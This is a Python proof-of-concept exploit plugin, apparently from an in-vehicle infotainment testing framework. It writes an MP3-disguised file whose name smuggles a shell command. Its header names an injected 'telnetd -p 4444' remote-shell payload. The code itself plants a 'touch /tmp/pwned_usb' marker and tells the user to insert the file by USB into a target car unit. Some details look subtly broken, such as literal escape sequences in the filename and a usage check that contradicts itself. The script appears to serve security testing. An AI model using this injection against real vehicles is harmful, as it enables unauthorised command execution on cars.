"""
PoC Name: Filename Command Injection
CVE: N/A
Component: Application Stack
Category: Application
Severity: High
CVSS: 7.5
Description: 恶意文件名Shell注入(;telnetd -p 4444;)
Prerequisites: 攻击机能够在本地生成文件。生成后须手动拷贝至 U盘 并插入车机触发扫描。
Usage: python3 56_Filename_Command_Injection.py
"""
import sys
import os
from iv_plugin_base import IVIVulnerabilityPlugin

class FilenameCmdInjectPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        return True

    def exploit(self):
        self.logger.info("准备生成多媒体文件名命令注入 Payload...")
        
        # 定义恶意的文件名
        # 很多早期的 IVI 直接把文件名放进 os.system("ffmpeg -i '" + filename + "' ...")
        # 如果文件名包含单引号闭合和反引号/分号，就会造成代码执行
        
        # payload 将在车载系统上执行：创建 /tmp/pwned_by_usb 标志文件或反弹 Shell
        malicious_filename = "track01'; touch \\x2ftmp\\x2fpwned_usb; echo 'pwned.mp3"
        safe_display_name = "track01_inject.mp3"
        
        payload_dir = "/tmp/ivi_usb_payloads"
        os.makedirs(payload_dir, exist_ok=True)
        
        full_path = ""
        
        try:
            # Python 中可以直接用包含了这些怪异字符的字符串创建文件
            # 为了防止在测试机自己搞出混乱，我们会在 payload_dir 下创建
            full_path = os.path.join(payload_dir, malicious_filename)
            
            self.logger.info(f"正在 {payload_dir} 构造物理文件...")
            
            # 写入一个合法的极简 MP3 头或者只是个空文件，系统只要扫文件名就会中招
            with open(full_path, "wb") as f:
                f.write(b"ID3\\x03\\x00\\x00\\x00\\x00\\x00\\x0a") # 假装是个 MP3
                f.write(b"MALICIOUS_CONTENT_HERE")
                
            self.logger.warning(f"[SUCCESS] 恶意媒体文件已在本地生成！")
            self.logger.warning(f"  绝对路径: {full_path}")
            self.logger.warning("[!] 请将此文件拷贝到物理U盘根目录，并插入到目标车机。")
            self.logger.warning("[!] 如果车机会自动索引音乐，此文件名将在解析时触发 Shell 命令：touch /tmp/pwned_usb")
            
            return {
                "status": "success",
                "vulnerable": True,
                "details": f"Generated malicious payload file at {payload_dir}/. Ready for USB transfer."
            }
            
        except Exception as e:
            self.logger.error(f"创建畸形文件名失败 (OS 可能不允许某些字符限制): {e}")
            return {"status": "error", "details": str(e)}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 56_Filename_Command_Injection.py")
        sys.exit(1)
    plugin = FilenameCmdInjectPlugin()
    plugin.run_verify()
